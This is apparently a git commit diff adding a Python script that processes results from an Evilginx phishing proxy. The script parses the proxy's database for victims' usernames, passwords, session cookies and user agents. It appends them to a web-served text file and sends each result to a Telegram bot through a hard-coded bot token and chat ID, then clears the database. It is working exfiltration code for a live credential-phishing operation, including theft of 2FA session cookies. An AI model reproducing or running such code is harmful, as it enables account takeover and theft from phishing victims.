8b960c1c68a23b4ba32f2b4b0052a84315382c49
mattew20201 <mattew20201@protonmail.com>
2024-06-14 19:19:13 -0700

    Add files via upload

--- sonder.py
+++ sonder.py
@@ -1,20 +1,30 @@
 file_path = '/root/.evilginx/data.db'
-file_useano="subtitute.txt"
+#EDIT this for costomer receive cookies /var/www/html/<costomer-site-name-for-ues>.txt
+file_useano="/var/www/html/qwQKTzBg.txt"
 file_content1=''
 file_content2=''
-toreplace=''
-replay=''
+totalline=0
+message=''
+username=''
+password=''
+tokens=''
+useragent=''
+createtime=''
+updatetime=''
 
 TOKEN='6579196085:AAHPWo16Q_scDH5m_A4iQlz4O7REfmokMws'
 CHAT_ID='7284568121'
 
 import requests
+import re
 
-with open(file_path, 'r') as file:
-    file_content1 = file.read() 
-    replay=file_content1
-    toreplace=file_content1
-    file.close()
+with open(file_path, 'r') as fp:
+    for totalline, line in enumerate(fp):
+        pass
+
+
+file=open(file_path, 'r')
+file_content1 = file.readlines() 
 
 
 with open(file_useano, 'r') as file:
@@ -22,28 +32,73 @@ with open(file_useano, 'r') as file:
     file.close()
 
 
-if file_content1 != file_content2:
-  print("YES")
-  with open(file_useano, 'w') as file:
-     print("YES1")
-     message=toreplace.replace(file_content2, '')
-     print("YES2")
-     file.write(toreplace)
-     print("YES3")
-     file.close()
-     print("YES4")
-     url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
-     print("YES5")
-     requests.get(url)
-     print("YES6")
-     
-  
-  
+count = 0
+cutpassword=''
 
+for line in file_content1:
+    count += 1
+    m = re.search('"password":"(.+?)","', line.strip())
+    if m:cutpassword=m.string.strip('"password":"''","')  
+           
+    if "domain" in line.strip():
+        user=re.search('"username":"(.+?)","', line.strip())
+        if user:
+           bolit=user.group(1)
+           username=bolit.strip('"useragent":"''","')
+        passw=re.search('"password":"(.+?)","', line.strip())
+        if passw:
+           voliw=passw.group(1)
+           password=voliw.strip('"password":"''","') 
+        toks=re.search('"tokens":{(.+?)},"', line.strip())
+        if toks:
+           tokax=toks.group(1)
+           tokens=tokax.strip('"tokens":{''},"') 
+        useage=re.search('"useragent":"(.+?)","', line.strip())
+        if useage:
+           koila=useage.group(1)
+           useragent=koila.strip('"useragent":"''","') 
+        message="YOU HAVE A NEW RESULT"+'\n'+"CLICK THE LINK TO VIEW COOKIES"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies:"+'https://results.0ma.site/qwQKTzBg.txt'
+        with open(file_useano, 'a') as file:
+         file.write("YOU HAVE A NEW RESULT"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies:"+tokens+'\n'+'\n')
+         file.close()
+        url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
+        requests.get(url)
+        message=''
+        username=''
+        password=''
+        tokens=''
+        useragent=''
+    elif cutpassword != '':
+        user=re.search('"username":"(.+?)","', line.strip())
+        if user:
+           bolit=user.group(1)
+           username=bolit.strip('"useragent":"''","')
+        passw=re.search('"password":"(.+?)","', line.strip())
+        if passw:
+           voliw=passw.group(1)
+           password=voliw.strip('"password":"''","') 
+        useage=re.search('"useragent":"(.+?)","', line.strip())
+        if useage:
+           koila=useage.group(1)
+           useragent=koila.strip('"useragent":"''","') 
+        message="YOU HAVE A NEW RESULT"+'\n'+"username:"+username+'\n'+"password:"+password+'\n'+"user agent:"+useragent+'\n'+"cookies: NO 2FA COOKIE PRESENT"+'\n'+'\n'
+        with open(file_useano, 'a') as file:
+         file.write(message)
+         file.close() 
+        url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
+        requests.get(url)
+        cutpassword='' 
+    
 
-  
-
-
+if count ==  totalline+1:
+       with open(file_path, 'w') as file:
+         file.write(" ")
+         file.close()
+         message=''
+         username=''
+         password=''
+         tokens=''
+         useragent=''
 
 print("DONE")
 
